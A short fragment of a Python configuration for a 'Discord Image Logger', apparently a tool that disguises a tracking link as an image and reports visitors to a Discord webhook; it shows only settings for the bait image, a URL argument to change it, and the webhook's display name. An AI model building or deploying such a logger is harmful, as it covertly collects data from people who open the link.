...
# Discord Image Logger | https://github.com/xyzcuff
...
config = {
    ...
    "image": "https://files.catbox.moe/sik2bf.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Daddy A2K", # Set this to the name you want the webhook to have
